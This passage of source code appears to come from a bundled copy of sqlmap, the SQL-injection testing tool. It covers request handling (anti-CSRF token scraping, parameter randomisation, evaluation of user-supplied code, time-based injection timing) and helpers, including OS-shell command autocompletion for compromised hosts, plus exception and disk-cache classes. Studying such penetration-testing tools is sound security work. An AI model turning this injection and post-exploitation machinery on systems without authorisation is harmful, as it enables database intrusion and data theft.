urlencode(parameter) in paramString:\n                    parameter = urlencode(parameter)\n\n                match = re.search(r\"%s=[^&]*\" % re.escape(parameter), paramString, re.I)\n                if match:\n                    retVal = re.sub(r\"(?i)%s\" % re.escape(match.group(0)), (\"%s=%s\" % (parameter, newValue)).replace('\\\\', r'\\\\'), paramString)\n                else:\n                    match = re.search(r\"(%s[\\\"']\\s*:\\s*[\\\"'])([^\\\"']*)\" % re.escape(parameter), paramString, re.I)\n                    if match:\n                        retVal = re.sub(r\"(?i)%s\" % re.escape(match.group(0)), \"%s%s\" % (match.group(1), newValue), paramString)\n\n                return retVal\n\n            for attempt in xrange(conf.csrfRetries + 1):\n                if token:\n                    break\n\n                if attempt > 0:\n                    warnMsg = \"unable to find anti-CSRF token '%s' at '%s'\" % (conf.csrfToken._original, conf.csrfUrl or conf.url)\n                    warnMsg += \". sqlmap is going to retry the request\"\n                    logger.warning(warnMsg)\n\n                page, headers, code = Connect.getPage(url=conf.csrfUrl or conf.url, data=conf.csrfData or (conf.data if conf.csrfUrl == conf.url else None), method=conf.csrfMethod or (conf.method if conf.csrfUrl == conf.url else None), cookie=conf.parameters.get(PLACE.COOKIE), direct=True, silent=True, ua=conf.parameters.get(PLACE.USER_AGENT), referer=conf.parameters.get(PLACE.REFERER), host=conf.parameters.get(PLACE.HOST))\n                page = urldecode(page)  # for anti-CSRF tokens with special characters in their name (e.g. 'foo:bar=...')\n\n                match = re.search(r\"(?i)<input[^>]+\\bname=[\\\"']?(?P<name>%s)\\b[^>]*\\bvalue=[\\\"']?(?P<value>[^>'\\\"]*)\" % conf.csrfToken, page or \"\", re.I)\n\n                if not match:\n                    match = re.search(r\"(?i)<input[^>]+\\bvalue=[\\\"']?(?P<value>[^>'\\\"]*)[\\\"']?[^>]*\\bname=[\\\"']?(?P<name>%s)\\b\" % conf.csrfToken, page or \"\", re.I)\n\n                    if not match:\n                        match = re.search(r\"(?P<name>%s)[\\\"']:[\\\"'](?P<value>[^\\\"']+)\" % conf.csrfToken, page or \"\", re.I)\n\n                        if not match:\n                            match = re.search(r\"\\b(?P<name>%s)\\s*[:=]\\s*(?P<value>\\w+)\" % conf.csrfToken, getUnicode(headers), re.I)\n\n                            if not match:\n                                match = re.search(r\"\\b(?P<name>%s)\\s*=\\s*['\\\"]?(?P<value>[^;'\\\"]+)\" % conf.csrfToken, page or \"\", re.I)\n\n                                if not match:\n                                    match = re.search(r\"<meta\\s+name=[\\\"']?(?P<name>%s)[\\\"']?[^>]+\\b(value|content)=[\\\"']?(?P<value>[^>\\\"']+)\" % conf.csrfToken, page or \"\", re.I)\n\n                if match:\n                    token.name, token.value = match.group(\"name\"), match.group(\"value\")\n\n                    match = re.search(r\"String\\.fromCharCode\\(([\\d+, ]+)\\)\", token.value)\n                    if match:\n                        token.value = \"\".join(_unichr(int(_)) for _ in match.group(1).replace(' ', \"\").split(','))\n\n                if not token:\n                    if conf.csrfUrl and conf.csrfToken and conf.csrfUrl != conf.url and code == _http_client.OK:\n                        if headers and PLAIN_TEXT_CONTENT_TYPE in headers.get(HTTP_HEADER.CONTENT_TYPE, \"\"):\n                            token.name = conf.csrfToken\n                            token.value = page\n\n                    if not token and conf.cj and any(re.search(conf.csrfToken, _.name, re.I) for _ in conf.cj):\n                        for _ in conf.cj:\n                            if re.search(conf.csrfToken, _.name, re.I):\n                                token.name, token.value = _.name, _.value\n                                if not any(re.search(conf.csrfToken, ' '.join(_), re.I) for _ in (conf.paramDict.get(PLACE.GET, {}), conf.paramDict.get(PLACE.POST, {}))):\n                                    if post:\n                                        post = \"%s%s%s=%s\" % (post, conf.paramDel or DEFAULT_GET_POST_DELIMITER, token.name, token.value)\n                                    elif get:\n                                        get = \"%s%s%s=%s\" % (get, conf.paramDel or DEFAULT_GET_POST_DELIMITER, token.name, token.value)\n                                    else:\n                                        get = \"%s=%s\" % (token.name, token.value)\n                                break\n\n            if not token:\n                errMsg = \"anti-CSRF token '%s' can't be found at '%s'\" % (conf.csrfToken._original, conf.csrfUrl or conf.url)\n                if not conf.csrfUrl:\n                    errMsg += \". You can try to rerun by providing \"\n                    errMsg += \"a valid value for option '--csrf-url'\"\n                raise SqlmapTokenException(errMsg)\n\n            if token:\n                token.value = token.value.strip(\"'\\\"\")\n\n                for candidate in (PLACE.GET, PLACE.POST, PLACE.CUSTOM_POST, PLACE.URI):\n                    if candidate in conf.parameters:\n                        if candidate == PLACE.URI and uri:\n                            uri = _adjustParameter(uri, token.name, token.value)\n                        elif candidate == PLACE.GET and get:\n                            get = _adjustParameter(get, token.name, token.value)\n                        elif candidate in (PLACE.POST, PLACE.CUSTOM_POST) and post:\n                            post = _adjustParameter(post, token.name, token.value)\n\n                for i in xrange(len(conf.httpHeaders)):\n                    if conf.httpHeaders[i][0].lower() == token.name.lower():\n                        conf.httpHeaders[i] = (conf.httpHeaders[i][0], token.value)\n\n        if conf.rParam:\n            def _randomizeParameter(paramString, randomParameter):\n                retVal = paramString\n                match = re.search(r\"(\\A|\\b)%s=(?P<value>[^&;]*)\" % re.escape(randomParameter), paramString)\n                if match:\n                    origValue = match.group(\"value\")\n                    newValue = randomizeParameterValue(origValue) if randomParameter not in kb.randomPool else random.sample(kb.randomPool[randomParameter], 1)[0]\n                    retVal = re.sub(r\"(\\A|\\b)%s=[^&;]*\" % re.escape(randomParameter), \"%s=%s\" % (randomParameter, newValue), paramString)\n                else:\n                    match = re.search(r\"(\\A|\\b)(%s\\b[^\\w]+)(?P<value>\\w+)\" % re.escape(randomParameter), paramString)\n                    if match:\n                        origValue = match.group(\"value\")\n                        newValue = randomizeParameterValue(origValue) if randomParameter not in kb.randomPool else random.sample(kb.randomPool[randomParameter], 1)[0]\n                        retVal = paramString.replace(match.group(0), \"%s%s\" % (match.group(2), newValue))\n                return retVal\n\n            for randomParameter in conf.rParam:\n                for item in (PLACE.GET, PLACE.POST, PLACE.COOKIE, PLACE.URI, PLACE.CUSTOM_POST):\n                    if item in conf.parameters:\n                        if item == PLACE.GET and get:\n                            get = _randomizeParameter(get, randomParameter)\n                        elif item in (PLACE.POST, PLACE.CUSTOM_POST) and post:\n                            post = _randomizeParameter(post, randomParameter)\n                        elif item == PLACE.COOKIE and cookie:\n                            cookie = _randomizeParameter(cookie, randomParameter)\n                        elif item == PLACE.URI and uri:\n                            uri = _randomizeParameter(uri, randomParameter)\n\n        if conf.evalCode:\n            delimiter = conf.paramDel or DEFAULT_GET_POST_DELIMITER\n            variables = {\"uri\": uri, \"lastPage\": threadData.lastPage, \"_locals\": locals(), \"cookie\": cookie}\n            originals = {}\n\n            if not get and PLACE.URI in conf.parameters:\n                query = _urllib.parse.urlsplit(uri).query or \"\"\n            else:\n                query = None\n\n            for item in filterNone((get, post if not kb.postHint else None, query)):\n                for part in item.split(delimiter):\n                    if '=' in part:\n                        name, value = part.split('=', 1)\n                        name = name.strip()\n                        if safeVariableNaming(name) != name:\n                            conf.evalCode = re.sub(r\"\\b%s\\b\" % re.escape(name), safeVariableNaming(name), conf.evalCode)\n                            name = safeVariableNaming(name)\n                        value = urldecode(value, convall=True, spaceplus=(item == post and kb.postSpaceToPlus))\n                        variables[name] = value\n\n            if post and kb.postHint in (POST_HINT.JSON, POST_HINT.JSON_LIKE):\n                for name, value in (parseJson(post) or {}).items():\n                    if safeVariableNaming(name) != name:\n                        conf.evalCode = re.sub(r\"\\b%s\\b\" % re.escape(name), safeVariableNaming(name), conf.evalCode)\n                        name = safeVariableNaming(name)\n                    variables[name] = value\n\n            if cookie:\n                for part in cookie.split(conf.cookieDel or DEFAULT_COOKIE_DELIMITER):\n                    if '=' in part:\n                        name, value = part.split('=', 1)\n                        name = name.strip()\n                        if safeVariableNaming(name) != name:\n                            conf.evalCode = re.sub(r\"\\b%s\\b\" % re.escape(name), safeVariableNaming(name), conf.evalCode)\n                            name = safeVariableNaming(name)\n                        value = urldecode(value, convall=True)\n                        variables[name] = value\n\n            while True:\n                try:\n                    compile(getBytes(re.sub(r\"\\s*;\\s*\", \"\\n\", conf.evalCode)), \"\", \"exec\")\n                except SyntaxError as ex:\n                    if ex.text:\n                        original = replacement = getUnicode(ex.text.strip())\n\n                        if '=' in original:\n                            name, value = original.split('=', 1)\n                            name = name.strip()\n                            if safeVariableNaming(name) != name:\n                                replacement = re.sub(r\"\\b%s\\b\" % re.escape(name), safeVariableNaming(name), replacement)\n                        else:\n                            for _ in re.findall(r\"[A-Za-z_]+\", original)[::-1]:\n                                if safeVariableNaming(_) != _:\n                                    replacement = replacement.replace(_, safeVariableNaming(_))\n                                    break\n\n                        if original == replacement:\n                            conf.evalCode = conf.evalCode.replace(EVALCODE_ENCODED_PREFIX, \"\")\n                            break\n                        else:\n                            conf.evalCode = conf.evalCode.replace(getUnicode(ex.text.strip(), UNICODE_ENCODING), replacement)\n                    else:\n                        break\n                else:\n                    break\n\n            originals.update(variables)\n            evaluateCode(conf.evalCode, variables)\n\n            for variable in list(variables.keys()):\n                if unsafeVariableNaming(variable) != variable:\n                    value = variables[variable]\n                    del variables[variable]\n                    variables[unsafeVariableNaming(variable)] = value\n\n            uri = variables[\"uri\"]\n            cookie = variables[\"cookie\"]\n\n            for name, value in variables.items():\n                if name != \"__builtins__\" and originals.get(name, \"\") != value:\n                    if isinstance(value, (int, float, six.string_types, six.binary_type)):\n                        found = False\n                        value = getUnicode(value, UNICODE_ENCODING)\n\n                        if kb.postHint == POST_HINT.MULTIPART:\n                            boundary = \"--%s\" % re.search(r\"boundary=([^\\s]+)\", contentType).group(1)\n                            if boundary:\n                                parts = post.split(boundary)\n                                match = re.search(r'\\bname=\"%s\"' % re.escape(name), post)\n                                if not match and parts:\n                                    parts.insert(2, parts[1])\n                                    parts[2] = re.sub(r'\\bname=\"[^\"]+\".*', 'name=\"%s\"' % re.escape(name), parts[2])\n                                for i in xrange(len(parts)):\n                                    part = parts[i]\n                                    if re.search(r'\\bname=\"%s\"' % re.escape(name), part):\n                                        match = re.search(r\"(?s)\\A.+?\\r?\\n\\r?\\n\", part)\n                                        if match:\n                                            found = True\n                                            first = match.group(0)\n                                            second = part[len(first):]\n                                            second = re.sub(r\"(?s).+?(\\r?\\n?\\-*\\Z)\", r\"%s\\g<1>\" % re.escape(value), second)\n                                            parts[i] = \"%s%s\" % (first, second)\n                                post = boundary.join(parts)\n\n                        elif kb.postHint and re.search(r\"\\b%s\\b\" % re.escape(name), post or \"\"):\n                            if kb.postHint in (POST_HINT.XML, POST_HINT.SOAP):\n                                if re.search(r\"<%s\\b\" % re.escape(name), post):\n                                    found = True\n                                    post = re.sub(r\"(?s)(<%s\\b[^>]*>)(.*?)(</%s)\" % (re.escape(name), re.escape(name)), r\"\\g<1>%s\\g<3>\" % value.replace('\\\\', r'\\\\'), post)\n                                elif re.search(r\"\\b%s>\" % re.escape(name), post):\n                                    found = True\n                                    post = re.sub(r\"(?s)(\\b%s>)(.*?)(</[^<]*\\b%s>)\" % (re.escape(name), re.escape(name)), r\"\\g<1>%s\\g<3>\" % value.replace('\\\\', r'\\\\'), post)\n\n                            elif kb.postHint in (POST_HINT.JSON, POST_HINT.JSON_LIKE):\n                                match = re.search(r\"['\\\"]%s['\\\"]:\" % re.escape(name), post)\n                                if match:\n                                    quote = match.group(0)[0]\n                                    post = post.replace(\"\\\\%s\" % quote, BOUNDARY_BACKSLASH_MARKER)\n                                    match = re.search(r\"(%s%s%s:\\s*)(\\d+|%s[^%s]*%s)\" % (quote, re.escape(name), quote, quote, quote, quote), post)\n                                    if match:\n                                        found = True\n                                        post = post.replace(match.group(0), \"%s%s\" % (match.group(1), value if value.isdigit() else \"%s%s%s\" % (match.group(0)[0], value, match.group(0)[0])))\n                                    post = post.replace(BOUNDARY_BACKSLASH_MARKER, \"\\\\%s\" % quote)\n\n                            regex = r\"\\b(%s)\\b([^\\w]+)(\\w+)\" % re.escape(name)\n                            if not found and re.search(regex, (post or \"\")):\n                                found = True\n                                post = re.sub(regex, r\"\\g<1>\\g<2>%s\" % value.replace('\\\\', r'\\\\'), post)\n\n                        regex = r\"((\\A|%s)%s=).+?(%s|\\Z)\" % (re.escape(delimiter), re.escape(name), re.escape(delimiter))\n                        if not found and re.search(regex, (post or \"\")):\n                            found = True\n                            post = re.sub(regex, r\"\\g<1>%s\\g<3>\" % value.replace('\\\\', r'\\\\'), post)\n\n                        if re.search(regex, (get or \"\")):\n                            found = True\n                            get = re.sub(regex, r\"\\g<1>%s\\g<3>\" % value.replace('\\\\', r'\\\\'), get)\n\n                        if re.search(regex, (query or \"\")):\n                            found = True\n                            uri = re.sub(regex.replace(r\"\\A\", r\"\\?\"), r\"\\g<1>%s\\g<3>\" % value.replace('\\\\', r'\\\\'), uri)\n\n                        regex = r\"((\\A|%s\\s*)%s=).+?(%s|\\Z)\" % (re.escape(conf.cookieDel or DEFAULT_COOKIE_DELIMITER), re.escape(name), re.escape(conf.cookieDel or DEFAULT_COOKIE_DELIMITER))\n                        if re.search(regex, (cookie or \"\")):\n                            found = True\n                            cookie = re.sub(regex, r\"\\g<1>%s\\g<3>\" % value.replace('\\\\', r'\\\\'), cookie)\n\n                        if not found:\n                            if post is not None:\n                                if kb.postHint in (POST_HINT.JSON, POST_HINT.JSON_LIKE):\n                                    match = re.search(r\"['\\\"]\", post)\n                                    if match:\n                                        quote = match.group(0)\n                                        post = re.sub(r\"\\}\\Z\", \"%s%s}\" % (',' if re.search(r\"\\w\", post) else \"\", \"%s%s%s:%s\" % (quote, name, quote, value if value.isdigit() else \"%s%s%s\" % (quote, value, quote))), post)\n                                else:\n                                    post += \"%s%s=%s\" % (delimiter, name, value)\n                            elif get is not None:\n                                get += \"%s%s=%s\" % (delimiter, name, value)\n                            elif cookie is not None:\n                                cookie += \"%s%s=%s\" % (conf.cookieDel or DEFAULT_COOKIE_DELIMITER, name, value)\n\n        if not conf.skipUrlEncode:\n            get = urlencode(get, limit=True)\n\n        if post is not None:\n            if place not in (PLACE.POST, PLACE.CUSTOM_POST) and hasattr(post, UNENCODED_ORIGINAL_VALUE):\n                post = getattr(post, UNENCODED_ORIGINAL_VALUE)\n            elif postUrlEncode:\n                post = urlencode(post, spaceplus=kb.postSpaceToPlus)\n\n        if timeBasedCompare and not conf.disableStats:\n            if len(kb.responseTimes.get(kb.responseTimeMode, [])) < MIN_TIME_RESPONSES:\n                clearConsoleLine()\n\n                kb.responseTimes.setdefault(kb.responseTimeMode, [])\n\n                if conf.tor:\n                    warnMsg = \"it's highly recommended to avoid usage of switch '--tor' for \"\n                    warnMsg += \"time-based injections because of inherent high latency time\"\n                    singleTimeWarnMessage(warnMsg)\n\n                warnMsg = \"[%s] [WARNING] %stime-based comparison requires \" % (time.strftime(\"%X\"), \"(case) \" if kb.responseTimeMode else \"\")\n                warnMsg += \"%s statistical model, please wait\" % (\"larger\" if len(kb.responseTimes) == 1 else \"reset of\")\n                dataToStdout(warnMsg)\n\n                while len(kb.responseTimes[kb.responseTimeMode]) < MIN_TIME_RESPONSES:\n                    value = kb.responseTimePayload.replace(RANDOM_INTEGER_MARKER, str(randomInt(6))).replace(RANDOM_STRING_MARKER, randomStr()) if kb.responseTimePayload else kb.responseTimePayload\n                    Connect.queryPage(value=value, content=True, raise404=False)\n                    dataToStdout('.')\n\n                dataToStdout(\" (done)\\n\")\n\n            elif not kb.testMode:\n                warnMsg = \"it is very important to not stress the network connection \"\n                warnMsg += \"during usage of time-based payloads to prevent potential \"\n                warnMsg += \"disruptions \"\n                singleTimeWarnMessage(warnMsg)\n\n            if not kb.laggingChecked:\n                kb.laggingChecked = True\n\n                deviation = stdev(kb.responseTimes[kb.responseTimeMode])\n\n                if deviation is not None and deviation > WARN_TIME_STDEV:\n                    kb.adjustTimeDelay = ADJUST_TIME_DELAY.DISABLE\n\n                    warnMsg = \"considerable lagging has been detected \"\n                    warnMsg += \"in connection response(s). Please use as high \"\n                    warnMsg += \"value for option '--time-sec' as possible (e.g. \"\n                    warnMsg += \"10 or more)\"\n                    logger.critical(warnMsg)\n\n        if (conf.safeFreq or 0) > 0:\n            kb.queryCounter += 1\n            if kb.queryCounter % conf.safeFreq == 0:\n                if conf.safeUrl:\n                    Connect.getPage(url=conf.safeUrl, post=conf.safePost, cookie=cookie, direct=True, silent=True, ua=ua, referer=referer, host=host)\n                elif kb.safeReq:\n                    Connect.getPage(url=kb.safeReq.url, post=kb.safeReq.post, method=kb.safeReq.method, auxHeaders=kb.safeReq.headers)\n\n        start = time.time()\n\n        if kb.nullConnection and not content and not response and not timeBasedCompare:\n            noteResponseTime = False\n\n            try:\n                pushValue(kb.pageCompress)\n                kb.pageCompress = False\n\n                if kb.nullConnection == NULLCONNECTION.HEAD:\n                    method = HTTPMETHOD.HEAD\n                elif kb.nullConnection == NULLCONNECTION.RANGE:\n                    auxHeaders[HTTP_HEADER.RANGE] = \"bytes=-1\"\n\n                _, headers, code = Connect.getPage(url=uri, get=get, post=post, method=method, cookie=cookie, ua=ua, referer=referer, host=host, silent=silent, auxHeaders=auxHeaders, raise404=raise404, skipRead=(kb.nullConnection == NULLCONNECTION.SKIP_READ))\n\n                if headers:\n                    try:\n                        if kb.nullConnection in (NULLCONNECTION.HEAD, NULLCONNECTION.SKIP_READ) and headers.get(HTTP_HEADER.CONTENT_LENGTH):\n                            pageLength = int(headers[HTTP_HEADER.CONTENT_LENGTH].split(',')[0])\n                        elif kb.nullConnection == NULLCONNECTION.RANGE and headers.get(HTTP_HEADER.CONTENT_RANGE):\n                            pageLength = int(headers[HTTP_HEADER.CONTENT_RANGE][headers[HTTP_HEADER.CONTENT_RANGE].find('/') + 1:])\n                    except ValueError:\n                        pass\n            finally:\n                kb.pageCompress = popValue()\n\n        if pageLength is None:\n            try:\n                page, headers, code = Connect.getPage(url=uri, get=get, post=post, method=method, cookie=cookie, ua=ua, referer=referer, host=host, silent=silent, auxHeaders=auxHeaders, response=response, raise404=raise404, ignoreTimeout=timeBasedCompare)\n            except MemoryError:\n                page, headers, code = None, None, None\n                warnMsg = \"site returned insanely large response\"\n                if kb.testMode:\n                    warnMsg += \" in testing phase. This is a common \"\n                    warnMsg += \"behavior in custom WAF/IPS solutions\"\n                singleTimeWarnMessage(warnMsg)\n\n        if not ignoreSecondOrder:\n            if conf.secondUrl:\n                page, headers, code = Connect.getPage(url=conf.secondUrl, cookie=cookie, ua=ua, silent=silent, auxHeaders=auxHeaders, response=response, raise404=False, ignoreTimeout=timeBasedCompare, refreshing=True)\n            elif kb.secondReq and IPS_WAF_CHECK_PAYLOAD not in _urllib.parse.unquote(value or \"\"):\n                def _(value):\n                    if kb.customInjectionMark in (value or \"\"):\n                        if payload is None:\n                            value = value.replace(kb.customInjectionMark, \"\")\n                        else:\n                            try:\n                                value = re.sub(r\"\\w*%s\" % re.escape(kb.customInjectionMark), payload, value)\n                            except re.error:\n                                value = re.sub(r\"\\w*%s\" % re.escape(kb.customInjectionMark), re.escape(payload), value)\n                    return value\n                page, headers, code = Connect.getPage(url=_(kb.secondReq[0]), post=_(kb.secondReq[2]), method=kb.secondReq[1], cookie=kb.secondReq[3], silent=silent, auxHeaders=dict(auxHeaders, **dict(kb.secondReq[4])), response=response, raise404=False, ignoreTimeout=timeBasedCompare, refreshing=True)\n\n        threadData.lastQueryDuration = calculateDeltaSeconds(start)\n\n        kb.originalCode = code if kb.originalCode is None else kb.originalCode\n        kb.originalPage = page if kb.originalPage is None else kb.originalPage\n\n        if kb.testMode:\n            kb.testQueryCount += 1\n\n        if timeBasedCompare:\n            return wasLastResponseDelayed()\n        elif noteResponseTime:\n            kb.responseTimes.setdefault(kb.responseTimeMode, [])\n            kb.responseTimes[kb.responseTimeMode].append(threadData.lastQueryDuration)\n            if len(kb.responseTimes[kb.responseTimeMode]) > MAX_TIME_RESPONSES:\n                kb.responseTimes[kb.responseTimeMode] = kb.responseTimes[kb.responseTimeMode][-MAX_TIME_RESPONSES // 2:]\n\n        if not response and removeReflection:\n            page = removeReflectiveValues(page, payload)\n\n        kb.maxConnectionsFlag = re.search(MAX_CONNECTIONS_REGEX, page or \"\", re.I) is not None\n\n        message = extractRegexResult(PERMISSION_DENIED_REGEX, page or \"\", re.I)\n        if message:\n            kb.permissionFlag = True\n            singleTimeWarnMessage(\"potential permission problems detected ('%s')\" % message)\n\n        headers = patchHeaders(headers)\n\n        if content or response:\n            return page, headers, code\n\n        if getRatioValue:\n            return comparison(page, headers, code, getRatioValue=False, pageLength=pageLength), comparison(page, headers, code, getRatioValue=True, pageLength=pageLength)\n        else:\n            return comparison(page, headers, code, getRatioValue, pageLength)\n\ndef setHTTPHandlers():  # Cross-referenced function\n    raise NotImplementedError\n", "lib/request/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "lib/core/shell.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport atexit\nimport os\n\nfrom lib.core import readlineng as readline\nfrom lib.core.common import getSafeExString\nfrom lib.core.data import logger\nfrom lib.core.data import paths\nfrom lib.core.enums import AUTOCOMPLETE_TYPE\nfrom lib.core.enums import OS\nfrom lib.core.settings import IS_WIN\nfrom lib.core.settings import MAX_HISTORY_LENGTH\n\ntry:\n    import rlcompleter\n\n    class CompleterNG(rlcompleter.Completer):\n        def global_matches(self, text):\n            \"\"\"\n            Compute matches when text is a simple name.\n            Return a list of all names currently defined in self.namespace\n            that match.\n            \"\"\"\n\n            matches = []\n            n = len(text)\n\n            for ns in (self.namespace,):\n                for word in ns:\n                    if word[:n] == text:\n                        matches.append(word)\n\n            return matches\nexcept:\n    readline._readline = None\n\ndef readlineAvailable():\n    \"\"\"\n    Check if the readline is available. By default\n    it is not in Python default installation on Windows\n    \"\"\"\n\n    return readline._readline is not None\n\ndef clearHistory():\n    if not readlineAvailable():\n        return\n\n    readline.clear_history()\n\ndef saveHistory(completion=None):\n    try:\n        if not readlineAvailable():\n            return\n\n        if completion == AUTOCOMPLETE_TYPE.SQL:\n            historyPath = paths.SQL_SHELL_HISTORY\n        elif completion == AUTOCOMPLETE_TYPE.OS:\n            historyPath = paths.OS_SHELL_HISTORY\n        elif completion == AUTOCOMPLETE_TYPE.API:\n            historyPath = paths.API_SHELL_HISTORY\n        else:\n            historyPath = paths.SQLMAP_SHELL_HISTORY\n\n        try:\n            with open(historyPath, \"w+\"):\n                pass\n        except:\n            pass\n\n        readline.set_history_length(MAX_HISTORY_LENGTH)\n        try:\n            readline.write_history_file(historyPath)\n        except IOError as ex:\n            warnMsg = \"there was a problem writing the history file '%s' (%s)\" % (historyPath, getSafeExString(ex))\n            logger.warning(warnMsg)\n    except KeyboardInterrupt:\n        pass\n\ndef loadHistory(completion=None):\n    if not readlineAvailable():\n        return\n\n    clearHistory()\n\n    if completion == AUTOCOMPLETE_TYPE.SQL:\n        historyPath = paths.SQL_SHELL_HISTORY\n    elif completion == AUTOCOMPLETE_TYPE.OS:\n        historyPath = paths.OS_SHELL_HISTORY\n    elif completion == AUTOCOMPLETE_TYPE.API:\n        historyPath = paths.API_SHELL_HISTORY\n    else:\n        historyPath = paths.SQLMAP_SHELL_HISTORY\n\n    if os.path.exists(historyPath):\n        try:\n            readline.read_history_file(historyPath)\n        except IOError as ex:\n            warnMsg = \"there was a problem loading the history file '%s' (%s)\" % (historyPath, getSafeExString(ex))\n            logger.warning(warnMsg)\n        except UnicodeError:\n            if IS_WIN:\n                warnMsg = \"there was a problem loading the history file '%s'. \" % historyPath\n                warnMsg += \"More info can be found at 'https://github.com/pyreadline/pyreadline/issues/30'\"\n                logger.warning(warnMsg)\n\ndef autoCompletion(completion=None, os=None, commands=None):\n    if not readlineAvailable():\n        return\n\n    if completion == AUTOCOMPLETE_TYPE.OS:\n        if os == OS.WINDOWS:\n            # Reference: http://en.wikipedia.org/wiki/List_of_DOS_commands\n            completer = CompleterNG({\n                \"attrib\": None, \"copy\": None, \"del\": None,\n                \"dir\": None, \"echo\": None, \"fc\": None,\n                \"label\": None, \"md\": None, \"mem\": None,\n                \"move\": None, \"net\": None, \"netstat -na\": None,\n                \"tree\": None, \"truename\": None, \"type\": None,\n                \"ver\": None, \"vol\": None, \"xcopy\": None,\n            })\n\n        else:\n            # Reference: http://en.wikipedia.org/wiki/List_of_Unix_commands\n            completer = CompleterNG({\n                \"cat\": None, \"chmod\": None, \"chown\": None,\n                \"cp\": None, \"cut\": None, \"date\": None, \"df\": None,\n                \"diff\": None, \"du\": None, \"echo\": None, \"env\": None,\n                \"file\": None, \"find\": None, \"free\": None, \"grep\": None,\n                \"id\": None, \"ifconfig\": None, \"ls\": None, \"mkdir\": None,\n                \"mv\": None, \"netstat\": None, \"pwd\": None, \"rm\": None,\n                \"uname\": None, \"whoami\": None,\n            })\n\n        readline.set_completer(completer.complete)\n        readline.parse_and_bind(\"tab: complete\")\n\n    elif commands:\n        completer = CompleterNG(dict(((_, None) for _ in commands)))\n        readline.set_completer_delims(' ')\n        readline.set_completer(completer.complete)\n        readline.parse_and_bind(\"tab: complete\")\n\n    loadHistory(completion)\n    atexit.register(saveHistory, completion)\n", "lib/core/exception.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nclass SqlmapBaseException(Exception):\n    pass\n\nclass SqlmapCompressionException(SqlmapBaseException):\n    pass\n\nclass SqlmapConnectionException(SqlmapBaseException):\n    pass\n\nclass SqlmapDataException(SqlmapBaseException):\n    pass\n\nclass SqlmapFilePathException(SqlmapBaseException):\n    pass\n\nclass SqlmapGenericException(SqlmapBaseException):\n    pass\n\nclass SqlmapInstallationException(SqlmapBaseException):\n    pass\n\nclass SqlmapMissingDependence(SqlmapBaseException):\n    pass\n\nclass SqlmapMissingMandatoryOptionException(SqlmapBaseException):\n    pass\n\nclass SqlmapMissingPrivileges(SqlmapBaseException):\n    pass\n\nclass SqlmapNoneDataException(SqlmapBaseException):\n    pass\n\nclass SqlmapNotVulnerableException(SqlmapBaseException):\n    pass\n\nclass SqlmapSilentQuitException(SqlmapBaseException):\n    pass\n\nclass SqlmapUserQuitException(SqlmapBaseException):\n    pass\n\nclass SqlmapShellQuitException(SqlmapBaseException):\n    pass\n\nclass SqlmapSkipTargetException(SqlmapBaseException):\n    pass\n\nclass SqlmapSyntaxException(SqlmapBaseException):\n    pass\n\nclass SqlmapSystemException(SqlmapBaseException):\n    pass\n\nclass SqlmapThreadException(SqlmapBaseException):\n    pass\n\nclass SqlmapTokenException(SqlmapBaseException):\n    pass\n\nclass SqlmapUndefinedMethod(SqlmapBaseException):\n    pass\n\nclass SqlmapUnsupportedDBMSException(SqlmapBaseException):\n    pass\n\nclass SqlmapUnsupportedFeatureException(SqlmapBaseException):\n    pass\n\nclass SqlmapValueException(SqlmapBaseException):\n    pass\n", "lib/core/bigarray.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import cPickle as pickle\nexcept:\n    import pickle\n\nimport itertools\nimport os\nimport sys\nimport tempfile\nimport zlib\n\nfrom lib.core.compat import xrange\nfrom lib.core.enums import MKSTEMP_PREFIX\nfrom lib.core.exception import SqlmapSystemException\nfrom lib.core.settings import BIGARRAY_CHUNK_SIZE\nfrom lib.core.settings import BIGARRAY_COMPRESS_LEVEL\n\ntry:\n    DEFAULT_SIZE_OF = sys.getsizeof(object())\nexcept TypeError:\n    DEFAULT_SIZE_OF = 16\n\ndef _size_of(instance):\n    \"\"\"\n    Returns total size of a given instance / object (in bytes)\n    \"\"\"\n\n    retval = sys.getsizeof(instance, DEFAULT_SIZE_OF)\n\n    if isinstance(instance, dict):\n        retval += sum(_size_of(_) for _ in itertools.chain.from_iterable(instance.items()))\n    elif hasattr(instance, \"__iter__\"):\n        retval += sum(_size_of(_) for _ in instance if _ != instance)\n\n    return retval\n\nclass Cache(object):\n    \"\"\"\n    Auxiliary class used for storing cached chunks\n    \"\"\"\n\n    def __init__(self, index, data, dirty):\n        self.index = index\n        self.data = data\n        self.dirty = dirty\n\nclass BigArray(list):\n    \"\"\"\n    List-like class used for storing large amounts of data (disk cached)\n\n    >>> _ = BigArray(xrange(100000))\n    >>> _[20] = 0\n    >>> _[99999]\n    99999\n    >>> _ += [0]\n    >>> _[100000]\n    0\n    >>> _ = _ + [1]\n    >>> _[-1]\n    1\n    \"\"\"\n\n    def __init__(self, items=None):\n        self.chunks = [[]]\n        self.chunk_length = sys.maxsize\n        self.cache = None\n        self.filenames = set()\n        self._os_remove = os.remove\n        self._size_counter = 0\n\n        for item in (items or []):\n            self.append(item)\n\n    def __add__(self, value):\n        retval = BigArray(self)\n\n        for _ in value:\n            retval.append(_)\n\n        return retval\n\n    def __iadd__(self, value):\n        for _ in value:\n            self.append(_)\n\n        return self\n\n    def append(self, value):\n        self.chunks[-1].append(value)\n\n        if self.chunk_length == sys.maxsize:\n            self._size_counter += _size_of(value)\n            if self._size_counter >= BIGARRAY_CHUNK_SIZE:\n                self.chunk_length = len(self.chunks[-1])\n                self._size_counter = None\n\n        if len(self.chunks[-1]) >= self.chunk_length:\n            filename = self._dump(self.chunks[-1])\n            self.chunks[-1] = filename\n            self.chunks.append([])\n\n    def extend(self, value):\n        for _ in value:\n            self.append(_)\n\n    def pop(self):\n        if len(self.chunks[-1]) < 1:\n            self.chunks.pop()\n            try:\n                with open(self.chunks[-1], \"rb\") as f:\n                    self.chunks[-1] = pickle.loads(zlib.decompress(f.read()))\n            except IOError as ex:\n                